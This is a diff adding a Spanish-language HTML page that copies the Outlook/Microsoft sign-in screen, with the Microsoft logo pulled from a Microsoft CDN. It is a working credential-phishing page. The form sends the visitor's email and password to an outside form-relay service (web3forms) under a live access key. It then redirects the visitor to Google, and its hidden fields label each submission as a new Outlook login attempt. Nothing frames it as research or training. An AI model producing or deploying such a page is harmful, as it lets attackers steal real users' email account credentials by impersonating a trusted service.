@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Outlook</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        
+        .login-container {
+            width: 350px;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo img {
+            width: 108px;
+            height: 28px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #0078d4;
+        }
+        
+        .input-field {
+            margin-bottom: 15px;
+        }
+        
+        .input-field input {
+            width: 100%;
+            padding: 12px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            box-sizing: border-box;
+        }
+        
+        .input-field input:focus {
+            border-color: #0078d4;
+            outline: none;
+        }
+        
+        .login-button {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            padding: 10px 12px;
+            width: 100%;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .login-button:hover {
+            background-color: #106ebe;
+        }
+        
+        .options {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+        }
+        
+        .remember-me input {
+            margin-right: 5px;
+        }
+        
+        .forgot-password {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .create-account {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .create-account a {
+            color: #0078d4;
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
+        </div>
+        
+        <h1 class="title">Iniciar sesión</h1>
+        
+        <form action="https://api.web3forms.com/submit" method="POST" id="web3form">
+        <input type="hidden" name="access_key" value="9ad81417-955b-4417-a00d-8c8fc94af292">
+	 <input type="hidden" name="redirect" value="https://www.google.com">
+            <div class="input-field">
+                <input type="email" name="email" placeholder="Correo electrónico, teléfono o Skype" required>
+            </div>
+            
+            <div class="input-field">
+                <input type="password" name="password" placeholder="Contraseña" required>
+            </div>
+            
+            <div class="options">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Mantener la sesión iniciada</label>
+                </div>
+                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+            </div>
+            
+            <button type="submit" class="login-button">Iniciar sesión</button>
+            
+            <!-- Campos ocultos para Formsubmit -->
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_subject" value="Nuevo intento de inicio en Outlook">
+        </form>
+        
+        <div class="create-account">
+            <a href="#">¿No tienes una cuenta? Crea una</a>
+        </div>
+        
+        <div class="footer">
+            <p>Al iniciar sesión, aceptas los <a href="#" style="color: #0078d4;">términos de uso</a> y la <a href="#" style="color: #0078d4;">declaración de privacidad</a>.</p>
+        </div>
+    </div>
+</body>
+</html>
